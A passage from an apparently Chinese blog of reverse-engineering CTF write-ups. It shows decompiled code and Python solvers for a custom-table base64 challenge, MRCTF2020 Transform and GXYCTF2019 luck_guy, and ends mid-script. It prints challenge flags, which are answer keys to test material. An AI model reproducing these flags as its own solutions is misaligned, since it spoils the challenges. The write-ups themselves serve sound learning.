punctuation">(</span> v3 <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">==</span> <span class="token function">strlen</span><span class="token punctuation">(</span>byte_40E0E4<span class="token punctuation">)</span> <span class="token punctuation">)</span>    result <span class="token operator">=</span> <span class="token function">sub_403CF8</span><span class="token punctuation">(</span>aAreYouHappyYes<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    result <span class="token operator">=</span> <span class="token function">sub_403CF8</span><span class="token punctuation">(</span>aAreYouHappyNo<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先看前面的这个函数</p><p><img src="/2021/05/28/CTF/image-20210607192629739.png" alt></p><p>跟进函数内部，很容易发现这就是一个换表的base64，原始的表为</p><pre class="line-numbers language-none"><code class="language-none">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意到引用这串字符串的，有个函数专门用来换表，函数的内容如下</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">sub_401000</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">char</span> v1<span class="token punctuation">;</span> <span class="token comment">// cl</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> result <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span> result <span class="token operator">&lt;</span> <span class="token number">15</span><span class="token punctuation">;</span> <span class="token operator">++</span>result <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v1 <span class="token operator">=</span> byte_40E0AA<span class="token punctuation">[</span>result<span class="token punctuation">]</span><span class="token punctuation">;</span>    byte_40E0AA<span class="token punctuation">[</span>result<span class="token punctuation">]</span> <span class="token operator">=</span> byte_40E0A0<span class="token punctuation">[</span>result<span class="token punctuation">]</span><span class="token punctuation">;</span>    byte_40E0A0<span class="token punctuation">[</span>result<span class="token punctuation">]</span> <span class="token operator">=</span> v1<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意到上面<code>byte_40E0A0</code>和<code>byte_40E0A0</code>交换位置，ez，意思就是对原始的表从第六位开始和原始的表的第15位开始后的9位进行调换位置即可。</p><p>然后就是最后的这个了，一般情况下进行base的时候应该是没有这个的，这个逆出了这个说明有问题</p><p><img src="/2021/05/28/CTF/image-20210607194310914.png" alt></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">sub_401030</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 v1<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">char</span> v2<span class="token punctuation">;</span> <span class="token comment">// al</span>  v1 <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">do</span>    <span class="token punctuation">&#123;</span>      v2 <span class="token operator">=</span> a1<span class="token punctuation">[</span><span class="token function">HIDWORD</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">&lt;</span> <span class="token string">'a'</span> <span class="token operator">||</span> v2 <span class="token operator">></span> <span class="token string">'z'</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">&lt;</span> <span class="token string">'A'</span> <span class="token operator">||</span> v2 <span class="token operator">></span> <span class="token string">'Z'</span> <span class="token punctuation">)</span>          <span class="token keyword">goto</span> LABEL_9<span class="token punctuation">;</span>        <span class="token function">LOBYTE</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span> <span class="token operator">=</span> v2 <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">else</span>      <span class="token punctuation">&#123;</span>        <span class="token function">LOBYTE</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span> <span class="token operator">=</span> v2 <span class="token operator">-</span> <span class="token number">32</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      a1<span class="token punctuation">[</span><span class="token function">HIDWORD</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> v1<span class="token punctuation">;</span>LABEL_9<span class="token operator">:</span>      <span class="token function">LODWORD</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token operator">++</span><span class="token function">HIDWORD</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token function">HIDWORD</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> v1<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>大小写相互转换，这里的逻辑大概清晰了，我们先找到加密后的flag如下</p><p><img src="/2021/05/28/CTF/image-20210607192901280.png" alt></p><p>这个应该就是flag转换后的样子，</p><pre class="line-numbers language-none"><code class="language-none">zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>先把这个字符串大小写互换之后进行base64的换标解密，写出完整版的poc如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> string<span class="token keyword">import</span> base64s <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span>enc_flag <span class="token operator">=</span> <span class="token string">'zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9'</span>encflag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> enc_flag<span class="token punctuation">:</span>    <span class="token keyword">if</span> i<span class="token punctuation">.</span>isupper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        encflag <span class="token operator">+=</span> i<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> i<span class="token punctuation">.</span>islower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        encflag <span class="token operator">+=</span> i<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        encflag <span class="token operator">+=</span> i<span class="token keyword">print</span><span class="token punctuation">(</span>encflag<span class="token punctuation">)</span><span class="token comment"># 换表base64</span>ss <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> s<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token operator">+</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">+</span> s<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">+</span> s<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">+</span> s<span class="token punctuation">[</span><span class="token number">16</span><span class="token operator">+</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token punctuation">]</span>table<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">.</span>maketrans<span class="token punctuation">(</span>ss<span class="token punctuation">,</span>s<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>encflag<span class="token punctuation">.</span>translate<span class="token punctuation">(</span>table<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># flag&#123;bAse64_h2s_a_Surprise&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>里面的换表的结果与原始表的排列是有关的，仔细看看那两个字符数组<code>byte_40E0A0</code>和<code>byte_40E0A0</code>就明白了。</p><h3 id="MRCTF2020-Transform"><a href="#MRCTF2020-Transform" class="headerlink" title="[MRCTF2020]Transform"></a>[MRCTF2020]Transform</h3><p><strong>TAG:简单异或</strong></p><p>首先是个exe可执行文件，先查一下是不是带壳的。</p><p><img src="/2021/05/28/CTF/image-20210608074332817.png" alt></p><p>64位无壳程序</p><p>拖入ida64位，找到关键函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> Str<span class="token punctuation">[</span><span class="token number">104</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-70h] BYREF</span>  <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment">// [rsp+88h] [rbp-8h]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+8Ch] [rbp-4h]</span>  <span class="token function">sub_402230</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_40E640</span><span class="token punctuation">(</span><span class="token string">"Give me your code:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_40E5F0</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> Str<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span>Str<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">33</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">sub_40E640</span><span class="token punctuation">(</span><span class="token string">"Wrong!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">32</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    byte_414040<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> Str<span class="token punctuation">[</span>dword_40F040<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    byte_414040<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token function">LOBYTE</span><span class="token punctuation">(</span>dword_40F040<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">32</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> byte_40F0E0<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">!=</span> byte_414040<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">sub_40E640</span><span class="token punctuation">(</span><span class="token string">"Wrong!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">sub_40E640</span><span class="token punctuation">(</span><span class="token string">"Right!Good Job!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_40E640</span><span class="token punctuation">(</span><span class="token string">"Here is your flag: %s\n"</span><span class="token punctuation">,</span> Str<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意到关键的数据有两个</p><pre class="line-numbers language-none"><code class="language-none">dword_40F040 &#x3D; [0x9, 0x0A, 0x0F, 0x17, 0x7, 0x18, 0x0C, 0x6, 0x1, 0x10, 0x3, 0x11, 0x20, 0x1D, 0x0B, 0x1E, 0x1B, 0x16,                0x4, 0x0D, 0x13, 0x14, 0x15, 0x2, 0x19, 0x5, 0x1F, 0x8, 0x12, 0x1A, 0x1C, 0x0E, 0x00]byte_40F0E0 &#x3D; [0x67, 0x79, 0x7B, 0x7F, 0x75, 0x2B, 0x3C, 0x52, 0x53, 0x79, 0x57, 0x5E, 0x5D, 0x42, 0x7B, 0x2D, 0x2A,               0x66, 0x42, 0x7E, 0x4C, 0x57, 0x79, 0x41, 0x6B, 0x7E, 0x65, 0x3C, 0x5C, 0x45, 0x6F, 0x62, 0x4D]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>Str</code>是flag，这里先将<code>dword_40F040</code>作为flag字符串的下标，然后<code>byte_40F0E0 = flag[dword_40F040] ^ dword_40F040</code></p><p>意思就是这么个意思啦，直接逆，由异或的特性易知<code>flag[dword_40F040] = byte_40F0E0 ^ dword_40F040</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">dword_40F040 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x9</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token number">0x0F</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0x7</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0x0C</span><span class="token punctuation">,</span> <span class="token number">0x6</span><span class="token punctuation">,</span> <span class="token number">0x1</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0x3</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">,</span> <span class="token number">0x0B</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0x1B</span><span class="token punctuation">,</span> <span class="token number">0x16</span><span class="token punctuation">,</span>                <span class="token number">0x4</span><span class="token punctuation">,</span> <span class="token number">0x0D</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">,</span> <span class="token number">0x2</span><span class="token punctuation">,</span> <span class="token number">0x19</span><span class="token punctuation">,</span> <span class="token number">0x5</span><span class="token punctuation">,</span> <span class="token number">0x1F</span><span class="token punctuation">,</span> <span class="token number">0x8</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x1A</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0x0E</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">]</span>byte_40F0E0 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0x79</span><span class="token punctuation">,</span> <span class="token number">0x7B</span><span class="token punctuation">,</span> <span class="token number">0x7F</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x79</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x5E</span><span class="token punctuation">,</span> <span class="token number">0x5D</span><span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span> <span class="token number">0x7B</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span>               <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span> <span class="token number">0x7E</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x79</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x6B</span><span class="token punctuation">,</span> <span class="token number">0x7E</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x5C</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0x6F</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x4D</span><span class="token punctuation">]</span>flag <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token builtin">len</span><span class="token punctuation">(</span>byte_40F0E0<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>byte_40F0E0<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag<span class="token punctuation">[</span>dword_40F040<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> byte_40F0E0<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> dword_40F040<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#  MRCTF&#123;Tr4nsp0sltiON_Clph3r_1s_3z&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以说是右手就行。</p><p><strong>注意下标的那个数组的最后一位补上0x00，要不不满足33位的条件，把那个最后的0x08换成0x00</strong></p><h2 id="Linux下文件逆向-elf文件逆向"><a href="#Linux下文件逆向-elf文件逆向" class="headerlink" title="Linux下文件逆向(elf文件逆向)"></a>Linux下文件逆向(elf文件逆向)</h2><h3 id="GXYCTF2019-luck-guy"><a href="#GXYCTF2019-luck-guy" class="headerlink" title="[GXYCTF2019]luck_guy"></a>[GXYCTF2019]luck_guy</h3><p><strong>关键代码寻找与审计</strong></p><p>这题应该是可以使用ida &amp; ubuntu实现动态调试的，但是我一看配置环境还要浪费许多时间，就直接进行逆向分析好了。下面的是get_flag()函数的代码</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v0<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-3Ch]</span>  <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-38h]</span>  __int64 s<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-30h] BYREF</span>  <span class="token keyword">char</span> v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-28h]</span>  <span class="token keyword">unsigned</span> __int64 v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+38h] [rbp-8h]</span>  v6 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v0 <span class="token operator">=</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">srand</span><span class="token punctuation">(</span>v0<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">200</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"OK, it's flag:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x28uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">strcat</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> f1<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//f1=GXY&#123;do_not_</span>        <span class="token function">strcat</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token operator">&amp;</span>f2<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//f2=</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Solar not like you"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Solar want a girlfriend"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">4</span><span class="token operator">:</span>        s <span class="token operator">=</span> <span class="token number">0x7F666F6067756369LL</span><span class="token punctuation">;</span>        v5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token function">strcat</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>f2<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">5</span><span class="token operator">:</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">7</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> j <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>            <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>f2 <span class="token operator">+</span> j<span class="token punctuation">)</span> <span class="token operator">-=</span> <span class="token number">2</span><span class="token punctuation">;</span>          <span class="token keyword">else</span>            <span class="token operator">--</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>f2 <span class="token operator">+</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">default</span><span class="token operator">:</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"emmm,you can't find flag 23333"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v6<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面的switch需要正确排序才能获得正确的flag，这里很明显case1是最后一个，前两个猜测分别是case4和case5，就有下面的脚本</p><p><strong>逆向脚本</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">flag1 <span class="token operator">=</span> <span class="token string">'GXY&#123;do_not_'</span>flag2 <span class="token operator">=</span> <span class="token string">''</span>s <span class="token operator">=</span> <span class="token string">'7F666F6067756369'</span>res1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    temp <span class="token operator">=</span> <span class="token string">'0x'</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token 